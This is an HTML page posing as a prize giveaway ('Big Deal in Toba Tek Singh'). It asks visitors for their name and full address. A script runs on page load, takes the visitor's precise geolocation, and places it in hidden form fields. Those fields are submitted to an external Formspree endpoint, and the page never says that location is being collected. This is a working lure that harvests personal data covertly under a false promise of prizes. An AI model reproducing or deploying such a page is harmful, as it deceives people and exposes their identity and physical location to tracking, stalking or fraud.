<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Give Me Back</title>
  </head>
  <body>
    <div class="form-wrapper">
      <form action="https://formspree.io/f/xdknpejk" method="POST">
        <h1 style="text-align: center">Big Deal in Toba Tek Singh</h1>
        <p style="text-align: center; font-size: 20px">
          Submit form to win lucky prizes!
        </p>
        <p>
          <label>Name <input type="text" name="name" /></label>
        </p>
        
        <p>
          <label>Complete Address <input type="text" name="address" /></label>
        </p>

        <input
          type="hidden"
          name="latitude"
          id="latitude"
          placeholder="Latitude"
        />
        <input
          type="hidden"
          name="longitude"
          id="longitude"
          placeholder="Longitude"
        />

        <p id="location" style="display: none"></p>
        <!-- Element to display location info -->
        <div id="map" style="display: none"></div>
        <!-- Element for the map -->

        <button type="submit" class="submitBtn">Send</button>
      </form>
    </div>

    <script>
      function showUserLocation() {
        const locationElement = document.getElementById("location");
        const latitudeInput = document.getElementById("latitude");
        const longitudeInput = document.getElementById("longitude");
        const mapElement = document.getElementById("map");

        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            (position) => {
              const { latitude, longitude } = position.coords;
              locationElement.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;

              // Set latitude and longitude in input fields
              latitudeInput.value = latitude;
              longitudeInput.value = longitude;

              // Embed the map with user's location
              const mapUrl = `https://maps.google.com/maps?q=${latitude},${longitude}&z=15&output=embed`;
              mapElement.innerHTML = `<iframe width="100%" height="100%" src="${mapUrl}" frameborder="0" allowfullscreen></iframe>`;
            },
            (error) => {
              console.error("Geolocation error: ", error);
              locationElement.textContent = "Unable to retrieve your location.";
            },
            {
              enableHighAccuracy: true,
              maximumAge: 0,
              timeout: 5000,
            }
          );
        } else {
          locationElement.textContent =
            "Geolocation is not supported by this browser.";
        }
      }

      // Call the function when the page loads
      window.onload = showUserLocation;
    </script>

    <style>
      @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap");
      body {
        font-family: "Poppins", sans-serif;
        margin: 0;
        padding: 0;
        height: 100vh;
        display: flex;
      }

      @media screen and (max-width: 768px) {
        body {
          display: block;
        }
        .form-wrapper {
          width: 100% !important;
        }
      }

      .hero {
        background-color: #f4f4f4;
        padding: 50px;
        position: relative;
      }

      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }

      button {
        padding: 10px 20px;
        font-size: 16px;
        color: #fff;
        background-color: #3498db;
        border: none;
        border-radius: 5px;
        cursor: pointer;
      }

      button:disabled {
        background-color: #ddd;
      }

      .form-section {
        display: none;
        background-color: #fff;
        padding: 30px;
        margin: 20px;
        border-radius: 8px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      }

      .form-group {
        margin-bottom: 15px;
      }

      form input,
      form select {
        width: 96%;
        padding: 24px 10px;
        font-size: 16px;
        border: 1px solid #ddd;
        border-radius: 20px;
      }

      /* Set the size of the map */
      #map {
        height: 400px;
        width: 100%;
        border: 1px solid #ccc;
        margin-top: 20px;
      }

      .form-wrapper {
        width: 800px;
        margin: auto;
        padding: 60px 30px;
        box-shadow: rgba(149, 157, 165, 0.2) 0px 8px 24px;
        border-radius: 50px;
      }

      .submitBtn {
        background-color: #3498db;
        border: none;
        border-radius: 20px;
        cursor: pointer;
        padding: 24px 10px;
        width: 100%;
      }
    </style>
  </body>
</html>
